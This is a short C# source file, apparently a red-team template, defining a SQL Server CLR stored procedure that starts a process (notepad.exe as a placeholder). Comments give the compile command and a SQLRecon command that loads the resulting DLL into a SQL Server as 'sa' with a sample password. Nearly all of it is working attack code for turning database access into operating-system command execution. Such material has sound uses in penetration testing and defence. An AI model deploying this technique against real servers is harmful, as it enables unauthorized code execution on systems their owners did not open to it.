//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\sql.cs
//SQLRecon.exe -a Local -s SQL02 -d master -u sa -p Password123 -m clr -o c:\temp\sql.dll -f CustomFunctionName
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;

public partial class StoredProcedures
{       
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void CustomFunctionName ()
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
        proc.Start();
    }
}